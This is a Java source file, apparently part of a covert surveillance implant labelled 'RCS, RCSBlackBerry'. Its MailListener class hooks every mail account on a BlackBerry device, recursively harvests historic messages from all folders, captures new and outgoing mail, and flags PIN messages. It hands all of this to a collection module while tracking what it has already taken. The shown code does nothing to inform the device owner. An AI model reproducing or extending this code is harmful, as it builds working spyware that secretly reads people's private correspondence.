//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

/**
 * 
 */
package blackberry.module.mail;

import java.util.Date;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;
import net.rim.blackberry.api.mail.event.StoreEvent;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.IntHashtable;
import blackberry.Singleton;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.interfaces.MailObserver;
import blackberry.interfaces.iSingleton;
import blackberry.module.ModuleMessage;

/**
 * The listener interface for receiving mail events. The class that is
 * interested in processing a mail event implements this interface, and the
 * object created with that class is registered with a component using the
 * component's <code>addMailListener<code> method. When
 * the mail event occurs, that object's appropriate
 * method is invoked.
 * 
 * @author user1
 */
public final class MailListener implements FolderListener, SendListener,
        iSingleton { //, StoreListener, SendListener {

    //#ifdef DEBUG
    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
    //#endif

    String[] names;
    private boolean collecting;

    protected static IntHashtable fieldTable;
    private static ServiceRecord[] mailServiceRecords;
    //private Filter realtimeFilter;
    //private Filter collectFilter;

    //Vector mailObservers = new Vector();
    MailObserver mailObserver;
    private boolean isRunning;

    private static MailListener instance;
    private static final long GUID = 0xc997041f3236870dL;

    private void MailListener() {

    }

    public static synchronized MailListener getInstance() {
        if (instance == null) {
            instance = (MailListener) Singleton.self().get(GUID);
            if (instance == null) {
                final MailListener singleton = new MailListener();

                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    /**
     * Start.
     */
    public void start() {

        final ServiceBook serviceBook = ServiceBook.getSB();
        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
        //mailServiceRecords = serviceBook.getRecords();

        names = new String[mailServiceRecords.length];
        //#ifdef DEBUG
        debug.trace("Starting: " + mailServiceRecords.length + " accounts");
        //#endif

        /*
         * // to forever realtimeFilter = (Filter) ((ModuleMessage)
         * ModuleMessage.getInstance()) .getFilterEmailRealtime(); // history
         * collectFilter = (Filter) ((ModuleMessage)
         * ModuleMessage.getInstance()) .getFilterEmailCollect();
         */

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            try {
                final ServiceConfiguration sc = new ServiceConfiguration(
                        mailServiceRecords[count]);
                final Store store = Session.getInstance(sc).getStore();
                addListeners(store);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("Cannot add listener. Count: " + count);
                //#endif
            }
        }

        synchronized(this){
            isRunning = true;
        }

        //#ifdef DEBUG
        debug.trace("Started");
        //#endif

    }

    /**
     * Stop.
     */
    public void stop() {
        //#ifdef DEBUG
        debug.trace("Stopping");
        //#endif
        if (mailServiceRecords != null) {
            for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

                final ServiceConfiguration sc = new ServiceConfiguration(
                        mailServiceRecords[count]);
                final Store store = Session.getInstance(sc).getStore();
                removeListeners(store);
            }
        }

        synchronized(this){
            isRunning = false;
        }
        //#ifdef DEBUG
        debug.trace("Stopped");
        //#endif
    }

    public void addSingleMailObserver(final MailObserver observer) {
        //#ifdef DEBUG
        debug.trace("addMailObserver");
        //#endif
        mailObserver = observer;

        if (!isRunning()) {
            //#ifdef DEBUG
            debug.trace("addMailObserver, not running, so start");
            //#endif
            start();
        }
    }

    public void removeSingleMailObserver(
            final MailObserver observer) {
        //#ifdef DEBUG
        debug.trace("removeMailObserver");
        //#endif
        mailObserver = null;

        if (isRunning()) {
            //#ifdef DEBUG
            debug.trace("removeSingleMailObserver,  running, so stop");
            //#endif
            stop();
        }
    }

    private void addListeners(final Store store) {
        //#ifdef DEBUG
        debug.info("Adding listeners to store: " + store.toString());
        //#endif
        store.addFolderListener(this);
        store.addSendListener(this);
        //store.addStoreListener(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.StoreListener#batchOperation(net.rim
     * .blackberry.api.mail.event.StoreEvent)
     */
    public void batchOperation(final StoreEvent arg0) {
        //#ifdef DEBUG
        debug.info("batchOperation: " + arg0);
        //#endif

    }

    public synchronized boolean isRunning() {
        return isRunning;
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesAdded(net.rim
     * .blackberry.api.mail.event.FolderEvent)
     */
    public void messagesAdded(final FolderEvent folderEvent) {
        init();
        
        final Message message = folderEvent.getMessage();
        final String folderName = message.getFolder().getFullName();

        final boolean added = folderEvent.getType() == FolderEvent.MESSAGE_ADDED;

        
        
        //#ifdef DEBUG
        debug.info("Added Message: " + message + " folderEvent: " + folderEvent
                + " folderName: " + folderName);
        //#endif

        try {
            final int type = folderEvent.getType();
            if (type != FolderEvent.MESSAGE_ADDED) {
                //#ifdef DEBUG
                debug.info("filterMessage type: " + type);
                //#endif
                return;
            }

            Filter realtimeFilter = ModuleMessage.getInstance()
                    .getFilterEmailRealtime();

            //long lastcheck = messageAgent.getLastCheck(folderName);
            // realtime non guarda il lastcheck, li prende tutti.
            final int filtered = realtimeFilter.filterMessage(message, 0);
            if (filtered == Filter.FILTERED_OK) {
                dispatch(message, realtimeFilter.maxMessageSize, "local");
                //#ifdef DEBUG

                debug.trace("messagesAdded: " + message.getFolder().getName());

                //#endif
            } else {
                //#ifdef DEBUG
                debug.trace("filter refused: " + filtered);
                //#endif
            }

            if (!collecting) {
                //C.1=COLLECT
                /*
                 * ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
                 * Messages.getString("C.1"), new Date());
                 */
                //String parent = message.getFolder().getParent().getName();
                //String folder = message.getFolder().getName();
                String fullname = message.getFolder().getFullName();
                ModuleMessage.getInstance().lastcheckSet(fullname, new Date());
            }

        } catch (final MessagingException ex) {
            //#ifdef DEBUG
            debug.error("cannot manage added message: " + ex);
            //#endif
        }
    }

    private void dispatch(Message message, int maxMessageSize,
            String string) {
        mailObserver.onNewMail(message, maxMessageSize, string);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesRemoved(net.
     * rim.blackberry.api.mail.event.FolderEvent)
     */
    public void messagesRemoved(final FolderEvent e) {
        final Message message = e.getMessage();
        //#ifdef DEBUG
        debug.init();
        debug.info("Removed Message" + message);
        //#endif

    }

    /**
     * Removes the listeners.
     * 
     * @param store
     *            the store
     */
    public void removeListeners(final Store store) {
        //#ifdef DEBUG
        debug.info("remove listeners");
        //#endif
        store.removeFolderListener(this);
        //store.removeSendListener(this);
        //store.removeStoreListener(this);
    }

    boolean stopHistory;

    public void stopHistory() {
        stopHistory = true;
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
            
        }
        Debug.init();
    }
    
    /**
     * retrieveHistoricMails.
     */
    public void retrieveHistoricMails() { 
        init();

        //#ifdef DEBUG
        debug.trace("retrieveHistoricMails");
        //#endif

        collecting = true;
        // questa data rappresenta l'ultimo controllo effettuato.
        // C.1=COLLECT
        /*
         * final Date lastCheckDate = ModuleMessage.getInstance().lastcheckGet(
         * Messages.getString("C.1"));
         */

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
            if (stopHistory) {
                break;
            }
            names[count] = mailServiceRecords[count].getName();
            //#ifdef DEBUG
            debug.trace("Email account name: " + names[count]);
            //#endif

            //Date lastCheckDateName = ModuleMessage.getInstance().lastcheckGet(names[count]);

            //names[count] = mailServiceRecords[0].getName();
            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();

            final Folder[] folders = store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolders(names[count], folders);
            ModuleMessage.getInstance().lastcheckSave();

            //ModuleMessage.getInstance().lastcheckSet(names[count], new Date());
        }

        //#ifdef DEBUG
        debug.trace("End search");
        //#endif

        collecting = false;
        stopHistory = false;
    }

    /**
     * scansione ricorsiva della directories.
     * 
     * @param name
     * @param subfolders
     *            the subfolders
     */
    public void scanFolders(final String storeName, final Folder[] subfolders) {
        Folder[] dirs;

        Filter collectFilter = ModuleMessage.getInstance()
                .getFilterEmailCollect();

        //#ifdef DBC
        Check.requires(subfolders != null && subfolders.length >= 0,
                "scanFolders");
        Check.requires(collectFilter != null,
                "scanFolders, collectFilter == null");
        //#endif

        if (collectFilter == null) {
            //#ifdef DEBUG
            debug.trace("scanFolders, no collectFilter, messageAgent: "
                    + ModuleMessage.getInstance());
            //#endif
            if (ModuleMessage.getInstance() != null) {

                collectFilter = (Filter) ((ModuleMessage) ModuleMessage
                        .getInstance()).getFilterEmailCollect();
                //#ifdef DEBUG
                debug.trace("scanFolders, get collectFilter: " + collectFilter);
                //#endif
            }
        }

        if (collectFilter == null) {
            //#ifdef DEBUG
            debug.error("scanFolders: null collectFilter");
            //#endif
            return;
        }

        for (int count = 0; count < subfolders.length; count++) {

            final Folder folder = subfolders[count];
            final String folderName = folder.getFullName();

            Date lastCheckDate = ModuleMessage.getInstance().lastcheckGet(
                    folderName);

            //#ifdef DEBUG
            debug.info("Folder name: " + folderName + " lastCheckDate:"
                    + lastCheckDate);
            //debug.trace("  getName: " + folder.getName());
            //debug.trace("  getType: " + folder.getType());
            //debug.trace("  getId: " + folder.getId());

            //#endif
            dirs = folder.list();
            if (dirs != null && dirs.length >= 0) {
                scanFolders(storeName, dirs);
            }

            try {
                final Message[] messages = folder.getMessages();

                //#ifdef DEBUG
                debug.info("  lastCheck: " + lastCheckDate);
                debug.info("  numMessages: " + messages.length);
                //#endif

                //#ifdef PIN_MESSAGES
                lookForPinMessages(messages);
                //#endif

                boolean next = false;
                boolean updateMarker = false;

                // Scandisco ogni e-mail dell'account di posta
                for (int j = messages.length - 1; j >= 0 && !next; j--) {
                    if (stopHistory) {
                        break;
                    }

                    try {
                        //#ifdef DEBUG
                        debug.trace("message # " + j + " folder " + folderName);
                        //#endif

                        final Message message = messages[j];

                        //#ifdef DBC
                        Check.asserts(message != null,
                                "scanFolders: message != null");
                        //#endif

                        int flags = message.getFlags();
                        //#ifdef DEBUG
                        debug.trace("flags: " + flags);
                        //#endif
                        final int filtered = collectFilter.filterMessage(
                                message, lastCheckDate.getTime());

                        //#ifdef DEBUG
                        debug.trace("filtered: " + filtered);
                        //#endif

                        switch (filtered) {
                            case Filter.FILTERED_OK:
                                //#ifdef DBC
                                Check.asserts(storeName != null,
                                        "scanFolders: storeName != null");
                                //#endif

                                dispatch(message, collectFilter.maxMessageSize,
                                        storeName);
                                
                                updateMarker = true;

                                break;
                            case Filter.FILTERED_DISABLED:
                            case Filter.FILTERED_NOTFOUND:
                                //updateMarker = false; //fallthrough, inibisce l'updateLastCheck

                            case Filter.FILTERED_LASTCHECK:
                            case Filter.FILTERED_DATEFROM:
                                next = true;
                                break;
                        }

                        //#ifdef DBC
                        int newflags = message.getFlags();
                        Check.asserts(flags == newflags, "scanFolders flags: "
                                + flags + " newflags: " + newflags);
                        //#endif

                    } catch (final Exception ex) {
                        //#ifdef DEBUG
                        debug.error("message # " + j + " ex:" + ex);
                        //#endif
                    }

                }

                if (updateMarker) {
                    ModuleMessage.getInstance().lastcheckSet(folderName,
                            new Date(), false);
                }

            } catch (final MessagingException e) {
                //#ifdef DEBUG
                debug.trace("Folder#getMessages() threw " + e.toString());
                //#endif
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("Scanning: " + ex);
                debug.error("Folder: " + folder);
                //#endif
            }
        }
    }

    private Date lookForPinMessages(final Message[] messages)
            throws MessagingException {

        //#ifdef DEBUG
        debug.trace("lookForPinMessages on: " + messages.length);
        //#endif

        // stampo le date.
        Date precRecDate = null;

        try {

            /* Date precSentDate = null; */
            for (int j = 0; j < messages.length; j++) {

                //debug.trace("1");
                final Message message = messages[j];
                if (precRecDate != null) {
                    //debug.trace("2");
                    //#ifdef DBC
                    Check.asserts(precRecDate.getTime() <= message
                            .getReceivedDate().getTime(),
                            "Wrong order Received: " + message.toString());
                    //#endif
                }
                //debug.trace("3");
                precRecDate = message.getReceivedDate();

                //debug.trace("4");
                Address address = null;
                try {
                    address = message.getFrom();
                } catch (Exception ex) {
                    //#ifdef DEBUG
                    debug.error(ex);
                    //#endif

                    //#ifdef DEBUG
                    debug.trace("lookForPinMessages: " + message.getBodyText());
                    //#endif

                }

                //debug.trace("5");
                if (message.getMessageType() == Message.PIN_MESSAGE) {
                    //#ifdef DEBUG
                    debug.info("PIN Message: " + message.getBodyText() + " s:"
                            + message.getSubject());
                    //#endif
                } else {
                    //debug.trace("6");
                    if (address != null) {
                        //debug.trace("7");
                        final String name = address.getName();
                        if (name != null && name.length() == 8
                                && name.indexOf("@") == -1
                                && name.indexOf(" ") == -1) {

                            //#ifdef DEBUG
                            debug.info("probably PIN Message From: " + name);
                            debug.trace("  s: " + message.getSubject());
                            debug.trace("  b: " + message.getBodyText());
                            //#endif
                        }

                    }

                    //debug.trace("8");

                    Address[] addresses = null;

                    try {
                        addresses = message
                                .getRecipients(Message.RecipientType.TO);
                    } catch (Exception ex) {
                        //#ifdef DEBUG
                        debug.error(ex);
                        //#endif
                    }
                    //debug.trace("9");
                    if (addresses != null) {
                        for (int i = 0; i < addresses.length; i++) {
                            address = addresses[i];
                            if (address != null) {

                                final String name = address.getAddr();
                                if (name != null && name.length() == 8
                                        && name.indexOf("@") == -1
                                        && name.indexOf(" ") == -1) {

                                    //#ifdef DEBUG
                                    debug.trace("probably PIN Message To: "
                                            + name);
                                    debug.trace("  s: " + message.getSubject());
                                    debug.trace("  b: " + message.getBodyText());
                                    //#endif
                                }
                            }
                        }
                    }
                }

            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

        return precRecDate;
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.SendListener#sendMessage(net.rim.blackberry
     * .api.mail.Message)
     */
    public boolean sendMessage(final Message message) {

        //#ifdef DEBUG
        debug.init();
        debug.trace("sending: " + message.getBodyText());
        //#endif

        return true;

    }

    public boolean haveNewAccount() {
        final ServiceBook serviceBook = ServiceBook.getSB();
        ServiceRecord[] actualServiceRecords = serviceBook
                .findRecordsByCid("CMIME");

        if (actualServiceRecords.length != mailServiceRecords.length) {
            //#ifdef DEBUG
            debug.info("haveNewAccount: len");
            //#endif
            return true;
        }

        for (int i = 0; i < actualServiceRecords.length; i++) {
            if (actualServiceRecords[i] != mailServiceRecords[i]) {
                //#ifdef DEBUG
                debug.info("haveNewAccount: " + i);
                //#endif
                return true;
            }
        }

        return false;
    }

}
